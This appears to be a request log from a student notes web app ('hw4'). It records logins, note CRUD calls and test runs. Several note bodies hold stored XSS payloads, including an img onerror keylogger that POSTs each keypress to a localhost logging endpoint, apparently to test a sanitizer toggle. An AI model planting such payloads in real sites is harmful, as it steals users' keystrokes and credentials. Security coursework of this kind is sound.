+[2025-06-14T15:39:13.636Z] DELETE /notes/684d918cb7db3d14870fcfa2 | No Body in Request
+[2025-06-14T15:39:15.978Z] OPTIONS /notes/684d91a5b7db3d14870fcfa9 | No Body in Request
+[2025-06-14T15:39:15.980Z] DELETE /notes/684d91a5b7db3d14870fcfa9 | No Body in Request
+[2025-06-14T15:39:18.141Z] OPTIONS /notes/684d91afb7db3d14870fcfac | No Body in Request
+[2025-06-14T15:39:18.143Z] DELETE /notes/684d91afb7db3d14870fcfac | No Body in Request
+[2025-06-14T15:39:21.759Z] OPTIONS /notes/684d91bcb7db3d14870fcfaf | No Body in Request
+[2025-06-14T15:39:21.763Z] DELETE /notes/684d91bcb7db3d14870fcfaf | No Body in Request
+[2025-06-14T15:39:34.513Z] OPTIONS /login | No Body in Request
+[2025-06-14T15:39:34.515Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-14T15:39:39.912Z] GET /notes | No Body in Request
+[2025-06-14T15:39:39.918Z] GET /notes | No Body in Request
+[2025-06-14T15:39:39.914Z] GET /notes | No Body in Request
+[2025-06-14T15:39:39.922Z] GET /notes | No Body in Request
+[2025-06-14T15:39:39.916Z] GET /notes | No Body in Request
+[2025-06-14T15:39:52.586Z] GET /notes | No Body in Request
+[2025-06-14T15:39:52.910Z] GET /notes | No Body in Request
+[2025-06-14T15:39:52.913Z] GET /notes | No Body in Request
+[2025-06-14T15:39:52.915Z] GET /notes | No Body in Request
+[2025-06-14T15:39:52.918Z] GET /notes | No Body in Request
+[2025-06-14T16:14:29.032Z] POST /users | Body: {"name":"Test User","email":"user1749917668987@example.com","username":"user1749917668987","password":"pass1749917668987"}
+[2025-06-14T16:14:30.773Z] POST /login | Body: {"username":"user1749917668987","password":"pass1749917668987"}
+[2025-06-14T16:14:30.994Z] POST /login | Body: {"username":"user1749917668987","password":"wrongPassword"}
+[2025-06-14T16:15:35.813Z] POST /users | Body: {"name":"Test User","email":"user1749917735772@example.com","username":"user1749917735772","password":"pass1749917735772"}
+[2025-06-14T16:15:37.025Z] POST /login | Body: {"username":"user1749917735772","password":"pass1749917735772"}
+[2025-06-14T16:15:37.250Z] POST /login | Body: {"username":"user1749917735772","password":"wrongPassword"}
+[2025-06-14T16:16:55.445Z] POST /users | Body: {"name":"Test User","email":"user1749917815408@example.com","username":"user1749917815408","password":"pass1749917815408"}
+[2025-06-14T16:16:56.235Z] POST /users | Body: {"name":"Note Tester","email":"note_1749917816205@test.com","username":"user_1749917816205","password":"pass_1749917816205"}
+[2025-06-14T16:16:56.643Z] POST /login | Body: {"username":"user1749917815408","password":"pass1749917815408"}
+[2025-06-14T16:16:56.861Z] POST /login | Body: {"username":"user1749917815408","password":"wrongPassword"}
+[2025-06-14T16:16:57.475Z] POST /login | Body: {"username":"user_1749917816205","password":"pass_1749917816205"}
+[2025-06-14T16:16:57.744Z] POST /notes | Body: {"title":"Test Note","content":"This is a test note.","author":{"name":"Note Tester","email":"note@test.com"}}
+[2025-06-14T16:16:57.920Z] GET /notes | No Body in Request
+[2025-06-14T16:16:58.262Z] PUT /notes/684da079ba7d83f3536c0122 | Body: {"title":"Updated Title"}
+[2025-06-14T16:16:58.433Z] DELETE /notes/684da079ba7d83f3536c0122 | No Body in Request
+[2025-06-14T16:16:58.602Z] POST /notes | Body: {"title":"Missing content and author"}
+[2025-06-14T16:16:58.610Z] POST /notes | Body: {"title":"Get by ID","content":"Content","author":{"name":"Author","email":"a@example.com"}}
+[2025-06-14T16:16:58.777Z] GET /notes/684da07aba7d83f3536c0129 | No Body in Request
+[2025-06-14T16:16:58.945Z] PUT /notes/000000000000000000000000 | Body: {"title":"Nonexistent"}
+[2025-06-14T16:16:59.108Z] DELETE /notes/000000000000000000000000 | No Body in Request
+[2025-06-14T16:16:59.270Z] GET /notes | No Body in Request
+[2025-06-15T09:34:38.237Z] GET /notes | No Body in Request
+[2025-06-15T09:34:38.622Z] GET /notes | No Body in Request
+[2025-06-15T09:34:38.627Z] GET /notes | No Body in Request
+[2025-06-15T09:34:38.630Z] GET /notes | No Body in Request
+[2025-06-15T09:34:38.633Z] GET /notes | No Body in Request
+[2025-06-15T09:35:11.186Z] OPTIONS /login | No Body in Request
+[2025-06-15T09:35:11.209Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T09:35:44.073Z] OPTIONS /notes | No Body in Request
+[2025-06-15T09:35:44.076Z] POST /notes | Body: {"title":"hw4","content":"<script>alert(\"You got hacked!\")</script>\n","author":{"name":"amir","email":"amir@amir"}}
+[2025-06-15T09:38:31.988Z] GET /notes | No Body in Request
+[2025-06-15T09:38:32.320Z] GET /notes | No Body in Request
+[2025-06-15T09:38:32.322Z] GET /notes | No Body in Request
+[2025-06-15T09:38:32.325Z] GET /notes | No Body in Request
+[2025-06-15T09:38:32.328Z] GET /notes | No Body in Request
+[2025-06-15T09:38:41.062Z] OPTIONS /login | No Body in Request
+[2025-06-15T09:38:41.064Z] POST /login | Body: {"username":"amir","password":""}
+[2025-06-15T09:38:44.075Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T09:39:48.935Z] OPTIONS /notes/684e93f0b4fcb417901d6c19 | No Body in Request
+[2025-06-15T09:39:48.938Z] PUT /notes/684e93f0b4fcb417901d6c19 | Body: {"title":"hw4","content":"<script>alert(\"You got hacked!\")</script>\n","author":{"name":"amir","email":"amir@amir"}}
+[2025-06-15T09:42:02.483Z] OPTIONS /notes/684e93f0b4fcb417901d6c19 | No Body in Request
+[2025-06-15T09:42:02.487Z] PUT /notes/684e93f0b4fcb417901d6c19 | Body: {"title":"hw4","content":"<img src=\"x\" onerror=\"alert('You got hacked!')\" />\n","author":{"name":"amir","email":"amir@amir"}}
+[2025-06-15T09:42:21.960Z] GET /notes | No Body in Request
+[2025-06-15T09:42:22.289Z] GET /notes | No Body in Request
+[2025-06-15T09:42:22.292Z] GET /notes | No Body in Request
+[2025-06-15T09:42:22.295Z] GET /notes | No Body in Request
+[2025-06-15T09:42:22.299Z] GET /notes | No Body in Request
+[2025-06-15T09:44:49.897Z] OPTIONS /login | No Body in Request
+[2025-06-15T09:44:49.899Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T09:46:16.250Z] OPTIONS /notes/684e93f0b4fcb417901d6c19 | No Body in Request
+[2025-06-15T09:46:16.253Z] PUT /notes/684e93f0b4fcb417901d6c19 | Body: {"title":"hw4","content":"<img src=x onerror=\"\n  document.addEventListener('keypress', function(e) {\n    fetch('http://localhost:3002/log', {\n      method: 'POST',\n      headers: { 'Content-Type': 'text/plain' },\n      body: e.key\n    });\n  });\n\" />\n","author":{"name":"amir","email":"amir@amir"}}
+[2025-06-15T09:46:37.738Z] OPTIONS /notes/684e93f0b4fcb417901d6c19 | No Body in Request
+[2025-06-15T09:46:37.741Z] PUT /notes/684e93f0b4fcb417901d6c19 | Body: {"title":"hw4","content":"<img src=x onerror=\"\n  document.addEventListener('keypress', function(e) {\n    fetch('http://localhost:3002/log', {\n      method: 'POST',\n      headers: { 'Content-Type': 'text/plain' },\n      body: e.key\n    });\n  });\n\" />\n","author":{"name":"amir","email":"amir@amir"}}
+[2025-06-15T09:47:20.557Z] GET /notes | No Body in Request
+[2025-06-15T09:47:20.899Z] GET /notes | No Body in Request
+[2025-06-15T09:47:20.904Z] GET /notes | No Body in Request
+[2025-06-15T09:47:20.908Z] GET /notes | No Body in Request
+[2025-06-15T09:47:20.913Z] GET /notes | No Body in Request
+[2025-06-15T09:47:25.857Z] OPTIONS /login | No Body in Request
+[2025-06-15T09:47:25.860Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T09:51:03.926Z] GET /notes | No Body in Request
+[2025-06-15T09:51:10.937Z] GET /notes | No Body in Request
+[2025-06-15T09:51:13.939Z] GET /notes | No Body in Request
+[2025-06-15T09:51:15.931Z] GET /notes | No Body in Request
+[2025-06-15T09:51:20.922Z] GET /notes | No Body in Request
+[2025-06-15T09:51:32.797Z] GET /notes | No Body in Request
+[2025-06-15T09:51:33.121Z] GET /notes | No Body in Request
+[2025-06-15T09:51:33.123Z] GET /notes | No Body in Request
+[2025-06-15T09:51:33.127Z] GET /notes | No Body in Request
+[2025-06-15T09:51:33.125Z] GET /notes | No Body in Request
+[2025-06-15T09:59:45.994Z] GET /notes | No Body in Request
+[2025-06-15T09:59:46.509Z] GET /notes | No Body in Request
+[2025-06-15T09:59:46.512Z] GET /notes | No Body in Request
+[2025-06-15T09:59:46.515Z] GET /notes | No Body in Request
+[2025-06-15T09:59:46.517Z] GET /notes | No Body in Request
+[2025-06-15T09:59:53.137Z] OPTIONS /login | No Body in Request
+[2025-06-15T09:59:53.140Z] POST /login | Body: {"username":"amir","password":"amri"}
+[2025-06-15T10:00:00.081Z] OPTIONS /login | No Body in Request
+[2025-06-15T10:00:00.085Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T10:38:05.709Z] GET /notes | No Body in Request
+[2025-06-15T10:38:06.055Z] GET /notes | No Body in Request
+[2025-06-15T10:38:06.060Z] GET /notes | No Body in Request
+[2025-06-15T10:38:06.063Z] GET /notes | No Body in Request
+[2025-06-15T10:38:06.067Z] GET /notes | No Body in Request
+[2025-06-15T10:39:11.691Z] GET /notes | No Body in Request
+[2025-06-15T10:39:12.029Z] GET /notes | No Body in Request
+[2025-06-15T10:39:12.033Z] GET /notes | No Body in Request
+[2025-06-15T10:39:12.037Z] GET /notes | No Body in Request
+[2025-06-15T10:39:12.040Z] GET /notes | No Body in Request
+[2025-06-15T10:39:58.599Z] GET /notes | No Body in Request
+[2025-06-15T10:39:58.956Z] GET /notes | No Body in Request
+[2025-06-15T10:39:58.959Z] GET /notes | No Body in Request
+[2025-06-15T10:39:58.960Z] GET /notes | No Body in Request
+[2025-06-15T10:39:58.962Z] GET /notes | No Body in Request
+[2025-06-15T10:40:08.272Z] OPTIONS /login | No Body in Request
+[2025-06-15T10:40:08.275Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T10:40:21.407Z] OPTIONS /notes/684d97825f1ea07ba0c0fa9c | No Body in Request
+[2025-06-15T10:40:21.409Z] PUT /notes/684d97825f1ea07ba0c0fa9c | Body: {"title":"zxcasdasd","content":"zxcv","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T10:40:52.031Z] OPTIONS /notes | No Body in Request
+[2025-06-15T10:40:52.034Z] POST /notes | Body: {"title":"asdas","content":"asdasd","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T10:44:40.749Z] GET /notes | No Body in Request
+[2025-06-15T10:44:41.089Z] GET /notes | No Body in Request
+[2025-06-15T10:44:41.093Z] GET /notes | No Body in Request
+[2025-06-15T10:44:41.096Z] GET /notes | No Body in Request
+[2025-06-15T10:44:41.099Z] GET /notes | No Body in Request
+[2025-06-15T10:53:13.500Z] GET /notes | No Body in Request
+[2025-06-15T10:53:13.829Z] GET /notes | No Body in Request
+[2025-06-15T10:53:13.833Z] GET /notes | No Body in Request
+[2025-06-15T10:53:13.837Z] GET /notes | No Body in Request
+[2025-06-15T10:53:13.840Z] GET /notes | No Body in Request
+[2025-06-15T10:55:03.049Z] GET /notes | No Body in Request
+[2025-06-15T10:55:03.384Z] GET /notes | No Body in Request
+[2025-06-15T10:55:03.388Z] GET /notes | No Body in Request
+[2025-06-15T10:55:03.399Z] GET /notes | No Body in Request
+[2025-06-15T10:55:03.395Z] GET /notes | No Body in Request
+[2025-06-15T10:59:56.099Z] GET /notes | No Body in Request
+[2025-06-15T10:59:56.430Z] GET /notes | No Body in Request
+[2025-06-15T10:59:56.433Z] GET /notes | No Body in Request
+[2025-06-15T10:59:56.436Z] GET /notes | No Body in Request
+[2025-06-15T10:59:56.439Z] GET /notes | No Body in Request
+[2025-06-15T11:01:32.268Z] GET /notes | No Body in Request
+[2025-06-15T11:01:32.604Z] GET /notes | No Body in Request
+[2025-06-15T11:01:32.607Z] GET /notes | No Body in Request
+[2025-06-15T11:01:32.610Z] GET /notes | No Body in Request
+[2025-06-15T11:01:32.612Z] GET /notes | No Body in Request
+[2025-06-15T11:03:15.201Z] GET /notes | No Body in Request
+[2025-06-15T11:03:15.537Z] GET /notes | No Body in Request
+[2025-06-15T11:03:15.540Z] GET /notes | No Body in Request
+[2025-06-15T11:03:15.546Z] GET /notes | No Body in Request
+[2025-06-15T11:03:15.543Z] GET /notes | No Body in Request
+[2025-06-15T11:07:01.915Z] GET /notes | No Body in Request
+[2025-06-15T11:07:02.256Z] GET /notes | No Body in Request
+[2025-06-15T11:07:02.259Z] GET /notes | No Body in Request
+[2025-06-15T11:07:02.262Z] GET /notes | No Body in Request
+[2025-06-15T11:07:02.266Z] GET /notes | No Body in Request
+[2025-06-15T11:07:03.727Z] GET /notes | No Body in Request
+[2025-06-15T11:07:04.064Z] GET /notes | No Body in Request
+[2025-06-15T11:07:04.066Z] GET /notes | No Body in Request
+[2025-06-15T11:07:04.068Z] GET /notes | No Body in Request
+[2025-06-15T11:07:04.069Z] GET /notes | No Body in Request
+[2025-06-15T11:08:28.144Z] GET /notes | No Body in Request
+[2025-06-15T11:08:28.518Z] GET /notes | No Body in Request
+[2025-06-15T11:08:28.521Z] GET /notes | No Body in Request
+[2025-06-15T11:08:28.526Z] GET /notes | No Body in Request
+[2025-06-15T11:08:28.530Z] GET /notes | No Body in Request
+[2025-06-15T11:09:44.158Z] GET /notes | No Body in Request
+[2025-06-15T11:09:44.518Z] GET /notes | No Body in Request
+[2025-06-15T11:09:44.522Z] GET /notes | No Body in Request
+[2025-06-15T11:09:44.526Z] GET /notes | No Body in Request
+[2025-06-15T11:09:44.531Z] GET /notes | No Body in Request
+[2025-06-15T11:16:23.944Z] GET /notes | No Body in Request
+[2025-06-15T11:16:24.280Z] GET /notes | No Body in Request
+[2025-06-15T11:16:24.282Z] GET /notes | No Body in Request
+[2025-06-15T11:16:24.285Z] GET /notes | No Body in Request
+[2025-06-15T11:16:24.289Z] GET /notes | No Body in Request
+[2025-06-15T11:16:59.081Z] GET /notes | No Body in Request
+[2025-06-15T11:16:59.419Z] GET /notes | No Body in Request
+[2025-06-15T11:16:59.421Z] GET /notes | No Body in Request
+[2025-06-15T11:16:59.424Z] GET /notes | No Body in Request
+[2025-06-15T11:16:59.426Z] GET /notes | No Body in Request
+[2025-06-15T11:37:12.444Z] GET /notes | No Body in Request
+[2025-06-15T11:37:12.834Z] GET /notes | No Body in Request
+[2025-06-15T11:37:12.839Z] GET /notes | No Body in Request
+[2025-06-15T11:37:12.845Z] GET /notes | No Body in Request
+[2025-06-15T11:37:12.850Z] GET /notes | No Body in Request
+[2025-06-15T11:37:15.517Z] GET /notes | No Body in Request
+[2025-06-15T11:37:15.853Z] GET /notes | No Body in Request
+[2025-06-15T11:37:15.849Z] GET /notes | No Body in Request
+[2025-06-15T11:37:15.857Z] GET /notes | No Body in Request
+[2025-06-15T11:37:15.860Z] GET /notes | No Body in Request
+[2025-06-15T11:48:15.954Z] GET /notes | No Body in Request
+[2025-06-15T11:48:16.292Z] GET /notes | No Body in Request
+[2025-06-15T11:48:16.295Z] GET /notes | No Body in Request
+[2025-06-15T11:48:16.298Z] GET /notes | No Body in Request
+[2025-06-15T11:48:16.300Z] GET /notes | No Body in Request
+[2025-06-15T11:48:18.855Z] GET /notes | No Body in Request
+[2025-06-15T11:48:19.193Z] GET /notes | No Body in Request
+[2025-06-15T11:48:19.197Z] GET /notes | No Body in Request
+[2025-06-15T11:48:19.202Z] GET /notes | No Body in Request
+[2025-06-15T11:48:19.200Z] GET /notes | No Body in Request
+[2025-06-15T11:49:38.621Z] OPTIONS /login | No Body in Request
+[2025-06-15T11:49:38.624Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T11:49:47.170Z] OPTIONS /login | No Body in Request
+[2025-06-15T11:49:47.173Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T11:51:46.938Z] GET /notes | No Body in Request
+[2025-06-15T11:51:47.273Z] GET /notes | No Body in Request
+[2025-06-15T11:51:47.276Z] GET /notes | No Body in Request
+[2025-06-15T11:51:47.279Z] GET /notes | No Body in Request
+[2025-06-15T11:51:47.282Z] GET /notes | No Body in Request
+[2025-06-15T11:52:40.262Z] OPTIONS /login | No Body in Request
+[2025-06-15T11:52:40.265Z] POST /login | Body: {"username":"amir","password":""}
+[2025-06-15T11:52:42.311Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T11:52:48.172Z] OPTIONS /notes/684e93f0b4fcb417901d6c19 | No Body in Request
+[2025-06-15T11:52:48.175Z] PUT /notes/684e93f0b4fcb417901d6c19 | Body: {"title":"hw4","content":"<img src=x onerror=\"\n  document.addEventListener('keypress', function(e) {\n    if (window.sanitizerOn === false) {\n      fetch('http://localhost:3002/log', {\n        method: 'POST',\n        headers: { 'Content-Type': 'text/plain' },\n        body: e.key\n      });\n    }\n  });\n\" />\n","author":{"name":"amir","email":"amir@amir"}}
+[2025-06-15T11:53:37.879Z] GET /notes | No Body in Request
+[2025-06-15T11:53:38.217Z] GET /notes | No Body in Request
+[2025-06-15T11:53:38.222Z] GET /notes | No Body in Request
+[2025-06-15T11:53:38.228Z] GET /notes | No Body in Request
+[2025-06-15T11:53:38.225Z] GET /notes | No Body in Request
+[2025-06-15T12:00:35.858Z] OPTIONS /login | No Body in Request
+[2025-06-15T12:00:35.860Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T12:00:41.070Z] OPTIONS /notes/684e93f0b4fcb417901d6c19 | No Body in Request
+[2025-06-15T12:00:41.074Z] PUT /notes/684e93f0b4fcb417901d6c19 | Body: {"title":"hw4","content":"<img src=x onerror=\"\n  if (!window.keyLoggerAttached) {\n    document.addEventListener('keypress', function(e) {\n      if (window.sanitizerOn === false) {\n        fetch('http://localhost:3002/log', {\n          method: 'POST',\n          headers: { 'Content-Type': 'text/plain' },\n          body: e.key\n        });\n      }\n    });\n    window.keyLoggerAttached = true;\n  }\n\" />\n","author":{"name":"amir","email":"amir@amir"}}
+[2025-06-15T12:00:43.968Z] GET /notes | No Body in Request
+[2025-06-15T12:00:44.313Z] GET /notes | No Body in Request
+[2025-06-15T12:00:44.317Z] GET /notes | No Body in Request
+[2025-06-15T12:00:44.322Z] GET /notes | No Body in Request
+[2025-06-15T12:00:44.328Z] GET /notes | No Body in Request
+[2025-06-15T12:10:05.615Z] GET / | No Body in Request
+[2025-06-15T12:11:44.178Z] GET / | No Body in Request
+[2025-06-15T12:18:41.786Z] GET /notes | No Body in Request
+[2025-06-15T12:18:42.167Z] GET /notes | No Body in Request
+[2025-06-15T12:18:42.170Z] GET /notes | No Body in Request
+[2025-06-15T12:18:42.173Z] GET /notes | No Body in Request
+[2025-06-15T12:18:42.172Z] GET /notes | No Body in Request
+[2025-06-15T12:23:31.756Z] GET / | No Body in Request
+[2025-06-15T12:25:10.282Z] GET / | No Body in Request
+[2025-06-15T12:28:50.116Z] OPTIONS /login | No Body in Request
+[2025-06-15T12:28:50.119Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T12:50:07.255Z] OPTIONS /login | No Body in Request
+[2025-06-15T12:50:07.258Z] POST /login | Body: {"username":"amir","password":"amri"}
+[2025-06-15T12:50:12.645Z] OPTIONS /login | No Body in Request
+[2025-06-15T12:50:12.648Z] POST /login | Body: {"username":"amir","password":"amir"}
+[2025-06-15T12:55:23.012Z] GET /notes | No Body in Request
+[2025-06-15T12:55:23.336Z] GET /notes | No Body in Request
+[2025-06-15T12:55:23.339Z] GET /notes | No Body in Request
+[2025-06-15T12:55:23.345Z] GET /notes | No Body in Request
+[2025-06-15T12:55:23.343Z] GET /notes | No Body in Request
+[2025-06-15T12:55:39.307Z] GET / | No Body in Request
+[2025-06-15T12:56:10.548Z] GET / | No Body in Request
+[2025-06-15T12:57:23.995Z] GET / | No Body in Request
+[2025-06-15T12:58:17.906Z] GET / | No Body in Request
+[2025-06-15T12:59:56.822Z] GET / | No Body in Request
+[2025-06-15T13:05:22.434Z] GET / | No Body in Request
+[2025-06-15T13:07:00.969Z] GET / | No Body in Request
+[2025-06-15T13:07:42.842Z] GET / | No Body in Request
+[2025-06-15T13:08:14.270Z] GET / | No Body in Request
+[2025-06-15T13:49:51.078Z] GET / | No Body in Request
+[2025-06-15T13:49:58.604Z] GET / | No Body in Request
+[2025-06-15T13:50:02.919Z] GET / | No Body in Request
+[2025-06-15T13:50:07.573Z] GET / | No Body in Request
+[2025-06-15T13:50:12.041Z] GET / | No Body in Request
+[2025-06-15T13:50:37.352Z] GET /notes | No Body in Request
+[2025-06-15T13:50:37.681Z] GET /notes | No Body in Request
+[2025-06-15T13:50:37.684Z] GET /notes | No Body in Request
+[2025-06-15T13:50:37.687Z] GET /notes | No Body in Request
+[2025-06-15T13:50:37.689Z] GET /notes | No Body in Request
+[2025-06-15T13:50:57.222Z] GET / | No Body in Request
+[2025-06-15T13:50:57.271Z] GET /favicon.ico | No Body in Request
+[2025-06-15T13:51:20.062Z] GET /notes | No Body in Request
+[2025-06-15T13:51:20.413Z] GET /notes | No Body in Request
+[2025-06-15T13:51:20.416Z] GET /notes | No Body in Request
+[2025-06-15T13:51:20.421Z] GET /notes | No Body in Request
+[2025-06-15T13:51:20.419Z] GET /notes | No Body in Request
+[2025-06-15T13:51:54.925Z] GET /notes | No Body in Request
+[2025-06-15T13:51:55.095Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:51:55.097Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:51:55.332Z] GET /notes | No Body in Request
+[2025-06-15T13:51:55.334Z] GET /notes | No Body in Request
+[2025-06-15T13:51:55.337Z] GET /notes | No Body in Request
+[2025-06-15T13:51:55.339Z] GET /notes | No Body in Request
+[2025-06-15T13:51:55.828Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:51:55.830Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:51:57.085Z] GET /notes | No Body in Request
+[2025-06-15T13:51:57.228Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:51:57.230Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:51:57.476Z] GET /notes | No Body in Request
+[2025-06-15T13:51:57.475Z] GET /notes | No Body in Request
+[2025-06-15T13:51:57.479Z] GET /notes | No Body in Request
+[2025-06-15T13:51:57.481Z] GET /notes | No Body in Request
+[2025-06-15T13:51:58.027Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:51:58.029Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:52:02.002Z] GET /notes | No Body in Request
+[2025-06-15T13:52:02.335Z] GET /notes | No Body in Request
+[2025-06-15T13:52:02.338Z] GET /notes | No Body in Request
+[2025-06-15T13:52:02.340Z] GET /notes | No Body in Request
+[2025-06-15T13:52:02.341Z] GET /notes | No Body in Request
+[2025-06-15T13:53:51.773Z] GET /notes | No Body in Request
+[2025-06-15T13:53:51.938Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:53:51.940Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:53:52.183Z] GET /notes | No Body in Request
+[2025-06-15T13:53:52.184Z] GET /notes | No Body in Request
+[2025-06-15T13:53:52.186Z] GET /notes | No Body in Request
+[2025-06-15T13:53:52.189Z] GET /notes | No Body in Request
+[2025-06-15T13:53:52.687Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:53:52.689Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:53:57.683Z] GET /notes | No Body in Request
+[2025-06-15T13:53:57.996Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:53:57.999Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:53:58.278Z] GET /notes | No Body in Request
+[2025-06-15T13:53:58.282Z] GET /notes | No Body in Request
+[2025-06-15T13:53:58.289Z] GET /notes | No Body in Request
+[2025-06-15T13:53:58.286Z] GET /notes | No Body in Request
+[2025-06-15T13:53:58.831Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:53:58.834Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:54:04.000Z] GET /notes | No Body in Request
+[2025-06-15T13:54:04.136Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:54:04.138Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:54:04.380Z] GET /notes | No Body in Request
+[2025-06-15T13:54:04.382Z] GET /notes | No Body in Request
+[2025-06-15T13:54:04.384Z] GET /notes | No Body in Request
+[2025-06-15T13:54:04.386Z] GET /notes | No Body in Request
+[2025-06-15T13:54:04.918Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:54:04.920Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:54:30.474Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:54:30.476Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:54:34.858Z] OPTIONS /notes/684ecffeb4fcb417901d6d95 | No Body in Request
+[2025-06-15T13:54:34.860Z] DELETE /notes/684ecffeb4fcb417901d6d95 | No Body in Request
+[2025-06-15T13:54:38.239Z] OPTIONS /notes/684ecffbb4fcb417901d6d87 | No Body in Request
+[2025-06-15T13:54:38.242Z] DELETE /notes/684ecffbb4fcb417901d6d87 | No Body in Request
+[2025-06-15T13:54:47.937Z] OPTIONS /notes/684ea334b4fcb417901d6c87 | No Body in Request
+[2025-06-15T13:54:47.940Z] DELETE /notes/684ea334b4fcb417901d6c87 | No Body in Request
+[2025-06-15T13:55:08.012Z] GET /notes | No Body in Request
+[2025-06-15T13:55:08.169Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:55:08.172Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:55:08.465Z] GET /notes | No Body in Request
+[2025-06-15T13:55:08.468Z] GET /notes | No Body in Request
+[2025-06-15T13:55:08.472Z] GET /notes | No Body in Request
+[2025-06-15T13:55:08.475Z] GET /notes | No Body in Request
+[2025-06-15T13:55:09.036Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:55:09.038Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:55:14.210Z] GET /notes | No Body in Request
+[2025-06-15T13:55:14.424Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:55:14.426Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:55:14.687Z] GET /notes | No Body in Request
+[2025-06-15T13:55:14.689Z] GET /notes | No Body in Request
+[2025-06-15T13:55:14.692Z] GET /notes | No Body in Request
+[2025-06-15T13:55:14.694Z] GET /notes | No Body in Request
+[2025-06-15T13:55:15.341Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:55:15.343Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:55:20.515Z] GET /notes | No Body in Request
+[2025-06-15T13:55:20.685Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:55:20.687Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:55:20.928Z] GET /notes | No Body in Request
+[2025-06-15T13:55:20.931Z] GET /notes | No Body in Request
+[2025-06-15T13:55:20.933Z] GET /notes | No Body in Request
+[2025-06-15T13:55:20.936Z] GET /notes | No Body in Request
+[2025-06-15T13:55:21.486Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:55:21.488Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:57:48.017Z] GET /notes | No Body in Request
+[2025-06-15T13:57:48.180Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:57:48.183Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:57:48.440Z] GET /notes | No Body in Request
+[2025-06-15T13:57:48.442Z] GET /notes | No Body in Request
+[2025-06-15T13:57:48.444Z] GET /notes | No Body in Request
+[2025-06-15T13:57:48.447Z] GET /notes | No Body in Request
+[2025-06-15T13:57:49.096Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:57:49.098Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:57:54.119Z] GET /notes | No Body in Request
+[2025-06-15T13:57:54.338Z] OPTIONS /login | No Body in Request
+[2025-06-15T13:57:54.341Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T13:57:54.612Z] GET /notes | No Body in Request
+[2025-06-15T13:57:54.610Z] GET /notes | No Body in Request
+[2025-06-15T13:57:54.616Z] GET /notes | No Body in Request
+[2025-06-15T13:57:54.619Z] GET /notes | No Body in Request
+[2025-06-15T13:57:55.250Z] OPTIONS /notes | No Body in Request
+[2025-06-15T13:57:55.253Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T13:58:00.674Z] GET /notes | No Body in Request
